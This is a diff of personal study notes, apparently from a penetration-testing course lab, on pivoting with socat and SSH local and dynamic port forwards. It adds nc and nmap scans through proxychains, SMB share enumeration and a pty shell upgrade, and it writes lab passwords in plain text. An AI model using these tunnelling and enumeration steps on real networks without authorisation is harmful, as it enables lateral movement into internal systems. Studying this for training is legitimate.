@@ -1502,35 +1502,52 @@ Reference
     `confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2222,fork TCP:10.4.124.215:22`  
   - Connecting to SSH server on PGDATABASE01, through the port forward on CONFLUENCE01  
     `ssh database_admin@192.168.124.63 -p2222`  
-- SSH Tunneling
-  - HRSHARES 172.16.114.217; PGDATABASE01 10.4.114.215; CONFLUENCE01 192.168.114.63
+- SSH Tunneling (local port forward)
+  - HRSHARES 172.16.114.217; PGDATABASE01 10.4.114.215; CONFLUENCE01 192.168.114.63  
   - manually mount folder in kali (share files from local to kali vm)  
     ```
     sudo mkdir -p /mnt/hgfs
     sudo vmhgfs-fuse .host:/ /mnt/hgfs -o allow_other
     ```
-  - tunneling: encapsulating one kind of data stream within another as it travels across a network. E.g ssh, rlogin/telnet (unencrypted).
-  - SSH port forwarding: tunneling data through an SSH connection.
-  - WAN (Kali) > DMS (CONFLUENCE01 - ssh client > PGDATABASE01 - ssh server > SMB)
-  - reverse shell TTY to PGDATABASE01 and login as database_admin
-    `confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'`
-    `ssh database_admin@10.4.114.215` pass: sqlpass123
-  - enumerate network interfaces on PGDATABASE01 > 10.4.114.215/24, 172.16.114.254/24
+  - tunneling: encapsulating one kind of data stream within another as it travels across a network. E.g ssh, rlogin/telnet (unencrypted).  
+  - SSH port forwarding: tunneling data through an SSH connection.  
+  - WAN (Kali) > DMS (CONFLUENCE01 - ssh client > PGDATABASE01 - ssh server > SMB)  
+  - reverse shell TTY to PGDATABASE01 and login as database_admin  
+    `confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'`  
+    `ssh database_admin@10.4.114.215` pass: sqlpass123  
+  - enumerate network interfaces on PGDATABASE01 > 10.4.114.215/24, 172.16.114.254/24  
     `ip addr`
-  - enumerate network routes/subnets on PGDATABASE01 > 10.4.114.0/24 dev ens192, 172.16.114.0/24 dev ens224
+  - enumerate network routes/subnets on PGDATABASE01 > 10.4.114.0/24 dev ens192, 172.16.114.0/24 dev ens224  
     `ip route`
-  - scan port 445 (SMB) on IPs from 172.16.50.1 to 172.16.50.254 > 172.16.114.217 SMB
+  - scan port 445 (SMB) on IPs from 172.16.50.1 to 172.16.50.254 > 172.16.114.217 SMB  
     `for i in $(seq 1 254); do nc -zv -w 1 172.16.114.$i 445; done`
-  - local port forward from CONFLUENCE01 (0.0.0.0:4455) to SSH tunnel 172.16.114.217:445
+  - local port forward from CONFLUENCE01 (0.0.0.0:4455) to SSH tunnel 172.16.114.217:445  
     `confluence@confluence01:/opt/atlassian/confluence/bin$ ssh -N -L 0.0.0.0:4455:172.16.114.217:445 database_admin@10.4.114.215`
-  - Port 4455 listening on all interfaces on  CONFLUENCE01
+  - Port 4455 listening on all interfaces on  CONFLUENCE01  
     `ss -ntplu`
-  - Listing SMB shares through the SSH local port forward running on CONFLUENCE01. > scripts
+  - Listing SMB shares through the SSH local port forward running on CONFLUENCE01. > scripts  
     `kali@kali:~$ smbclient -p 4455 -L //192.168.114.63/ -U hr_admin --password=Welcome1234`
-  - Listing files in the scripts share, using smbclient over our SSH local port forward running on CONFLUENCE01
+  - Listing files in the scripts share, using smbclient over our SSH local port forward running on CONFLUENCE01  
     `smbclient -p 4455 //192.168.114.63/scripts -U hr_admin --password=Welcome1234` `smb: \> ls` `smb: \> get Provisioning.ps1`
-- dddd
-- ddd
+- SSH Tunneling (dynamic port forward)  
+  - WAN (Kali) > DMZ (Confluence) > Internal (DB >>>...)  
+  - KALI 192.168.45.250, CONFLUENCE01 192.168.114.63, DB 10.4.114.215, HR 172.16.114.217  
+  - open SSH dynamic port forward on port 9999  
+    ```
+    confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'
+    ssh -N -D 0.0.0.0:9999 database_admin@10.4.114.215
+    ```
+  - edit the proxychain confi file > use smbclient from our Kali machine to enumerate available shares on HRSHARES  
+    `socks5 192.168.114.63 9999`
+  - smbclient connect to HRSHARES through the SOCKS proxy using Proxychains > scripts  
+    `proxychains smbclient -L //172.16.114.217/ -U hr_admin --password=Welcome1234`
+  - scan top 20 TCP ports on 172.16.50.217 > 135, 139, 445, 3389  
+    `sudo proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.114.217`
+  - ddd
+  - ddd
+- SSH Tunneling (remote port forward)
+- SSH Tunneling (remote dynamic port forward)
+- sshuttle
 ### 20. Tunneling through deep packet inspectation
 ### 21. The metassploit framework
 ### 22. Active directory introduction and enumeration
@@ -2708,6 +2725,19 @@ Reference
     - Connect to HR server via port 4242
       `./ssh_local_client -i 192.168.114.63 -p 4242`
   - SSH dynamic port forwarding
+    - Q1: nmap HR server
+      `sudo proxychains nmap -vvv -sT -p 4870-4880 -Pn 172.16.114.217`
+    - Q2: connect to HR server for the found port 4872
+      ```
+      #set dynamic port forward 9999
+      ssh -N -D 0.0.0.0:9999 database_admin@10.4.114.215
+      
+      #edit /etc/proxychains4.conf
+      socks5 192.168.114.63 9999
+
+      #connect to HRSHARES port 4872 via proxychains
+      proxychains ./ssh_dynamic_client -i 172.16.114.217 -p 4872
+      ```
   - SSH remote port forwarding
   - SSH remote dynamic port forwarding 
 - Port forward with window tools  
